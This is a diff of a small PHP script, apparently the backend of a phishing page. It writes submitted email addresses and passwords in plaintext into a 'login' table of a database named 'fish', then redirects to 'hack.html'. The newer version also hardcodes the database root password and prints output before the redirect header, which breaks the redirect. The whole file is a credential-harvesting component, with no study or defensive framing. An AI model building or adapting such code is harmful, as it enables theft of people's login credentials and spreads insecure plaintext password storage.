@@ -1,21 +1,30 @@
 <?php
-$conn = new mysqli('localhost', 'root', '', 'fish');
-if ($conn->connect_error) {
-    die("Connexion échouée : " . $conn->connect_error);
+$mail = $_POST["mail"] ?? "";
+$user_password = $_POST["password"] ?? "";
+
+$host = "localhost";
+$dbname = "fish";
+$username = "root";
+$db_password = "2006";
+
+// Connexion MySQL
+$conn = mysqli_connect($host, $username, $db_password, $dbname);
+
+if (!$conn) {
+    die ("Connexion échouée : " . mysqli_connect_error());
 }
 
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $mail = $_POST['mail'] ?? '';
-    $password = $_POST['password'] ?? '';
+echo "Connexion réussie.";
 
-    // Préparer la requête pour éviter les injections SQL
-    $stmt = $conn->prepare("INSERT INTO login (mail, password) VALUES (?, ?)");
-    $stmt->bind_param("ss", $mail, $password);
-    $stmt->execute();
-    $stmt->close();
-    $conn->close();
+$sql = "INSERT INTO login (mail, password) VALUES (?, ?)";
+$stmt = $conn->prepare($sql);
+$stmt->bind_param("ss", $mail, $user_password);
 
-    header('Location: index.html');
-    exit;
+if ($stmt->execute()) {
+    echo "Données enregistrées.";
+} else {
+    echo "Erreur DB : " . $stmt->error;
 }
-?>
+
+header('Location: hack.html');
+exit;
